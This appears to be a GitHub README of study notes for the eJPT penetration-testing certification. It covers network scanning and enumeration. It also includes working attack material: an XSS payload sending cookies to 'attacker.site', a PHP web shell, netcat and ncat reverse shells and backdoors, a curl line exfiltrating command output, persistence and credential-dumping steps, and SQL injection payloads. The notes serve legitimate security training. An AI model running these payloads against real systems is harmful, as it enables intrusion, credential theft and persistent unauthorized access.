<p align="center">
<img width="60%" src="https://github.com/edoardottt/images/blob/main/eJPT-notes/ejpt.jpg">
</p>

> **Note**
> These are all the notes I took while following the INE course for eJPT certification, I strongly think everything you need to pass the exam is in this 'cheatsheet'.

Info about eJPT certification [here](https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester-v2).  
Read also my [blog post](https://www.edoardoottavianelli.it/post/post7/post7.html) about eJPT certification.


#### Exam setup
- Download OPVN configuration file
- `sudo openvpn file.ovpn`
- Enter username and password
- CTRL+Z
- `bg`

#### Add a route in IP routes:
Linux:
```bash
ip route <destination network> via <gateway>
```

#### Show IP addresses:
Linux:
```bash
ip addr
```

#### Show CAM table:
Linux:
```bash
ip neighbor
```
or 
```bash
ifconfig
```

#### Show Listening ports (both UDP and TCP):  
Linux:
```bash
netstat -tunp
```

Windows:
```bash
netstat -ano
```

#### ARP Spoofing
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```
```bash
arpspoof -i <interface> -t <target> -r <host>
```
To intercept the traffic between 192.168.4.11 and 192.168.4.16
```bash
arpspoof -i eth0 -t 192.168.4.11 -r 192.168.4.16
```

#### Ping sweeping
```bash
fping -a -g 192.168.1.0/24 2> /dev/null
```
or 
```bash
fping -a -f targets.txt 2>/dev/null
```
or
```bash
nmap -sn 192.168.1.0/24
```
or
```bash
nmap -sn -iL networks.txt
```

#### OS Fingerprinting
```bash
nmap -Pn -O <target(s)>
```

#### Port Scanning

`nmap`...Then remember:
  - `-sT`: TCP Connect Scan, usually recorded in application logs
  - `-sS`: TCP Syn Scan, usually not recorded in app. logs (well configured IDSs do)
  - `-sV`: Version Detection Scan, TCP Connect Scan + Banner Detection

Example:
```bash
nmap -sS -p 1-100,443 192.168.1.13,14
```

Tip: Use `--reason` to show the explanation of why a port is marked open or closed  
Tip: Use `--open` to show only open, open|filtered, and unfiltered ports.

TCP Quick Scan
```bash
nmap -sV -sC 192.168.1.1
```
TCP Full Scan
```bash
nmap -sV -sC -p- 192.168.1.1
```
UDP Quick Scan
```bash
nmap -sV -sU 192.168.1.1
```
Get info on a particular service:
```bash
nmap -sC -p 27017 192.168.1.13 | less
```

#### Masscan
Check if masscan is properly installed:
```bash
masscan --regress
```
Scan example:
```bash
masscan -p22,80,443,53,3389,8080,445 -Pn --rate=800 --banners 192.168.1.0/24
```
If you want to use a VPN connection (configure the options properly):
```bash
masscan -p22,80,443,53,3389,8080,445 -Pn --rate=800 --banners 192.168.1.0/24 -e tap0 --router-ip 192.168.1.1
```
In order to save the configuration into a file:
```bash
masscan -p22,80,443,53,3389,8080,445 -Pn --rate=800 --banners 192.168.1.0/24 --echo > masscan.conf
```
Use the configuration file as input:
```bash
masscan -c masscan.conf
```

#### Web Fingerprinting
Using netcat:
```bash
nc 192.168.1.2 80
HEAD / HTTP/1.1
```
Using openssl:
```bash
openssl s_client -connect target.site:443
HEAD / HTTP/1.1
```
Using httprint:
```bash
httprint -P0 -h 192.168.1.1 -s /usr/local/bin/signatures.txt
```

#### Directory/Files enumeration with dirb 
Default scan:
```bash
dirb http://google.com
```
Using a custom wordlist:
```bash
dirb http://google.com /usr/share/dirb/wordlists/small.txt
```
Using cookies:
```bash
dirb http://google.com -c "COOKIE:XYZ"
```
Using Basic Authentication:
```bash
dirb http://google.com -u "admin:password"
```
Using Custom Header:
```bash
dirb http://google.com -H "MyHeader: MyContent"
```
Disable recursive enumeration:
```bash
dirb http://google.com -r
```
Set Speed delay in milliseconds:
```bash
dirb http://google.com -z 1000
```
Specify extensions:
```bash
dirb http://google.com -X ".php,.bak"
```
Save results in a file:
```bash
dirb http://google.com -o results.txt
```

#### Google Dorks
  - `site:` Include only results on a given hostname
  - `intitle:` Filters according to the title of a page
  - `inurl:` Similar to intitle but works on the URL of a resource
  - `filetype:` Filters by using the file extension of a resource
  - `AND`, `OR`, `|` Use logical operators to combine your expressions
  - `-` Filter out a keyword or a command's result

Example: `-inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf`  
See also the [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)

#### XSS
Payload: `<script>var i = new Image(); i.src = "http://attacker.site/log.php?q+"+document.cookie;</script>`  
Server:
```php
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>
```

#### SQLi
Payloads:
  - `' OR 'a'='a`
  - `' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a`
  - `' OR substr(user(),1,1) = 'a`
  - `' UNION SELECT user(); -- -`

Sqlmap:
  - `sqlmap -u 'http://victim.site/view.php?id=1141' --cookie "PHPSESSID=m42ba4etbktcktvjadirnsqqg4;`
  - `sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U`
  - `sqlmap -u 'http://victim.site/view.php?id=1141' --banner`
  - `sqlmap -u 'http://victim.site/view.php?id=1141' -v3 --fresh-queries`
  - `sqlmap -u 'http://victim.site/view.php?id=1141' --users`
  - `sqlmap -u 'http://victim.site/view.php?id=1141' --dbs`
  - `sqlmap -u 'http://victim.site/view.php?id=1141' --tables`
  - `sqlmap -u 'http://victim.site/view.php?id=1141' -D <db-name> -T <table-name>`
  - `sqlmap -u 'http://victim.site/view.php?id=1141' --current-db <db-name> --columns`
  - `sqlmap -u 'http://victim.site/view.php?id=1141' --current-db <db-name> --dump`
  - `sqlmap -u 'http://victim.site/login.php' --data='user=a&pass=a' -p user --technique=B --banner`
  - `sqlmap -r post-vuln-sqli.txt -p user --technique=B --banner`

Tip: Dump only the data you're interested in, not the whole database. Dumping a lot of data using SQLi is very noisy and a heavy process.

#### Misconfigured PUT method
```bash
wc -m payload.php
20 payload.php
```
```bash
nc victim.site 80
PUT /payload.php HTTP/1.1
Host: victim.site
Content-type: text/html
Content-length: 20

<?php phpinfo(); ?>
```

#### Uploading PHP shell
```php
<?php
if (isset($_GET['cmd']))
{
    $cmd = $_GET['cmd'];
    echo '<pre>';
    $result = shell_exec($cmd);
    echo $result;
    echo '</pre>';
}
?>
```

#### Authentication Cracking with Hydra
  - `hydra -U http-post-form` (get info on a module)
  - `hydra -L users.txt -P passwords.txt <service://server> <options>`
  - `hydra crackme.site http-post-form "/login.php:user=^USER^&pwd=^PASS^:invalid credentials" -L users.txt -P passwords.txt -f -V`
  - `hydra 192.168.1.2 ssh -L users.txt -P passwords.txt -f -V`

#### Authentication Cracking with nmap
  - `nmap -p 22 --script ssh-brute --script-args userdb=/root/users.txt demo.ine.local`

#### Authentication Cracking with metasploit
  - `use auxiliary/scanner/ssh/ssh_login`
  - `set RHOSTS demo.ine.local`
  - `set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt`
  - `set STOP_ON_SUCCESS true`
  - `set verbose true`
  - `exploit`

#### Password cracking using John the Ripper
  - `unshadow /etc/passwd /etc/shadow > crackme.txt`
  - `john --incremental -users:<users-list>  crackme.txt` (bruteforce, don't use it!)
  - `john --show crackme.txt`
  - `john --wordlist=<wordlist-filename> crackme.txt`
  - `john --wordlist=<wordlist-filename> --rules crackme.txt` (enable word mangling)

#### Cracking Password of Microsoft Word file using John the Ripper
 - `/usr/share/john/office2john.py MS_Word_Document.docx > hash`
 - `john --wordlist=passwds.txt hash`

#### Password cracking using Hashcat
  - `hashcat -m 0 -a 0 -D2 example0.hash example.dict` (m = 0 is MD5)
  - `hashcat -m 0 -a 0 -D2 example0.hash example.dict -r custom.rule`

#### Windows Shares
Interesting shares:
  - `\\ComputerName\C$` lets an administrator access a volume (C$, D$, E$...)
  - `\\ComputerName\admin$` points to the Windows installation directory

Enumerating shares (Windows):
  - `nbtstat -A 192.168.1.11`
  - `net view 192.168.1.11`
  - `net use \\192.168.1.11\IPC$ '' /u:''` (null session attack)
  - `enum -S 192.168.1.11` ([enum](https://packetstormsecurity.com/search/?q=win32+enum&s=files))
  - `enum -U 192.168.1.11`
  - `enum -P 192.168.1.11`

Enumerating shares (Linux):
  - `nmblookup -A 192.168.1.11`
  - `smbclient -L //192.168.1.11 -N`
  - `smbclient //192.168.1.11/IPC$ -N` (null session attack)
  - `enum4linux -n 192.168.1.11`
  - `enum4linux -P 192.168.1.11`
  - `enum4linux -S 192.168.1.11`
  - `enum4linux -s /usr/share/enum4linux/share-list.txt 192.168.1.11`
  - `enum4linux -a 192.168.1.11`
  - `smbmap -H demo.ine.local`
  - `nmap -sU -sV -p137,138 demo.ine.local`
  - `nmap -script=smb-enum-shares -Pn 192.168.1.11`
  - `nmap -script=smb-enum-users -Pn 192.168.1.11`
  - `nmap -script=smb-brute -Pn 192.168.1.11`
  - `nmap --script smb-vuln-* -Pn 192.168.1.11`
  - `python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.1.11`

#### Metasploit
```bash
msfconsole
```
```bash
show -h
```
```bash
search <keyword(s)>
```
```bash
use <path-to-exploit>
```
```bash
show options
```
```bash
set <option-name> <option-value> 
```
```bash
exploit
```

Tip: Use `show payloads` when an exploit is selected to show only the available payloads for that exploit  
Tip: Use `info` when an exploit is selected to get information about the exploit  
Tip: Use `back` when an exploit is selected to return to unselect it  

#### Meterpreter
Inside metasploit:
  - `search meterpreter`
  - `set payload <payload-path>`
  - `background`
  - `sessions -l` (list the sessions)
  - `sessions -i <session-id>` (resume a background session)
  - `sysinfo`
  - `ifconfig`
  - `route`
  - `getuid`
  - `getsystem`
  - You can use Unix-like commands like `pwd`, `ls`, `cd`...
  - `download <filename> <location>`
  - `upload <filename> <location>`
  - `shell`
  - `hashdump`
  - `run autoroute -h`
  - `run autoroute -s 192.130.110.0 -n 255.255.255.0 ` (pivoting towards that network)

Tip: `help` shows an amazing list of available commands divided by category  
Tip: If `getsystem` fails, use `use exploit/windows/local/bypassuac`  
Tip: `ps -U SYSTEM` shows only the processes with SYSTEM privileges  
Tip: Use `post/windows/gather/hashdump` to dump the passwords DB and save it for an offline cracking session  

#### Pivoting with Meterpreter
Let's say we have compromised a machine using metasploit and we have a meterpreter shell with session id 1. We discover that there is another machine but it's reachable only from the compromised machine.  
Our IP: `192.180.40.2`  
Compromised host: `192.180.40.3`  
Unreachable machine: `192.130.110.3`  

- `meterpreter > run autoroute -s 192.130.110.0 -n 255.255.255.0 1`
- `background`
- `msf > route`

If we want to scan the `192.130.110.0/24` network we can use:
```
msf > use auxiliary/scanner/portscan/tcp
msf > set PORTS 80, 8080, 445, 21, 22, ...
msf > set RHOSTS 192.130.110.1-254
msf > exploit
```

If we discover that at least one port is open and we want to target a specific port on a specific host (e.g. `192.130.110.3:21`) we can use:
  - `sessions 1` (back to meterpreter session)
  - `portfwd add -l 1234 -p 21 -r 192.130.110.3` (forwarding remote machine port 21 to the local machine port 1234)
  - `portfwd list`
  - `background`

Then if we want to scan the service we can use nmap:
```bash
msf > nmap -sS -sV -p 1234 localhost
```


#### Reverse shell with Netcat
Attacker:
```bash
nc -lvp 8888 -e /bin/bash
```
Target (the IP of the attacker):
```bash
nc -v 192.168.1.1 8888
```

#### Generate a reverse shell payload with msfvenom
```bash
msfvenom --list payloads | grep <keyword>
```
```bash
msfvenom -p php/reverse_php lhost=192.168.0.58 lport=443 -o reverse.php
```
```bash
msfvenom -p linux/x64/shell/reverse_tcp lhost=192.168.0.58 lport=443 -f elf -o reverse443
chmod +x reverse443
```

Note: If you have generated a meterpreter payload shell, you have to use meterpreter in order to receive back the connection  


#### Blind Remote Code Execution
Target (Use the Attacker IP)
```bash
curl http://192.168.1.130:53/`whoami`
```
or 
```bash
curl http://192.168.1.130:53/`id | base64`
```
Attacker:
```bash
nc -lvp 53
```

Tip: You can also create a reverse shell with `msfvenom` and let the target download it  

#### Enumerating users history with meterpreter
- `background`
- `use post/linux/gather/enum_users_history`
- `set SESSION 1`
- `exploit`

#### Data exfiltration with Netcat
Receiver:
```bash
nc -lvnp 8888 > received.txt
```
Sender (the IP of the receiver):
```bash
cat message.txt | nc -v 192.168.1.1 8888
```

#### Backdoor using ncat
Victim:
```bash
ncat -l -p 5555 -e cmd.exe
```
Attacker (the IP of the victim):
```bash
ncat 192.168.1.66 5555
```

#### Reverse Backdoor using ncat
Attacker:
```bash
ncat -l -p 5555 -v
```
Victim (the IP of the attacker):
```bash
ncat -e cmd.exe 192.168.1.66 5555
```
Tip: For persistent reverse backdoor use the registry key `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

#### Reverse Backdoor using Metasploit
```bash
msfconsole
use exploit/windows/local/s4u_persistence
show options
sessions
set session <session-id>
set trigger logon
set payload windows/meterpreter/reverse_tcp
set lhost <local-ip>
set lport 1234
exploit
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set lhost <local-ip>
set lport 1234
exploit
sysinfo
ps
help
```
Tip: once we get a shell we can use `screenshot` to get a picture of what the victim is seeing on the Desktop  
Tip: once we get a shell we can use `download filename location` to save the filename in the specified location on our machine  
Tip: Same syntax as above but use `upload` to upload files  
Tip: Use `getsystem` to gain the highest privilege (i.e. SYSTEM) on the compromised machine and `getuid` to check if it actually worked.

#### Upgrading a simple shell
```bash
bash -i
```
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

#### Maintaining access using Metasploit (Windows)
Inside a meterpreter session:
  - `background`
  - `use exploit/windows/local/persistence_service`
  - `show options`
  - `set SESSION <session-id>`
  - `exploit`

Use the backdoor:
  - `background`
  - `sessions -K`
  - `use exploit/multi/handler`
  - `set PAYLOAD windows/meterpreter/reverse_tcp`
  - `set LHOST <your-ip>`
  - `set LPORT 4444`
  - `exploit`

Note: The `<session-id>` is the one you can read when you type `background`  
Note: We need to use the same information about the backdoor to receive a new meterpreter session on the multi-handler. We can't change Payload, IP or Ports details.

#### Pivoting using a SOCKS Proxy
You have access to a compromised host and only from there you can access another machine. That machine exposes a web server, in order to access it from your computer set up a SOCKS proxy.

Add the route to the unreachable network using autoroute or route.

```bash
msf > use auxiliary/server/socks_proxy
msf > set VERSION 4a
msf > set SRVPORT 9050
msf > run -j
```

```bash
root@INE:~# proxychains nmap ...
```

Then you can also setup firefox in order to send request using the SOCKS proxy v4 at `127.0.0.1:9050`.

#### Dump AutoLogin stored credentials
Inside a meterpreter session:
  - `migrate -N explorer.exe`
  - `background`
  - `use post/windows/gather/credentials/windows_autologin`
  - `set SESSION <session-id>`
  - `exploit`

----------

If you find an error, just [open an issue](https://github.com/edoardottt/eJPT-notes/issues).

**Don't** text/mail me looking for exam solutions.
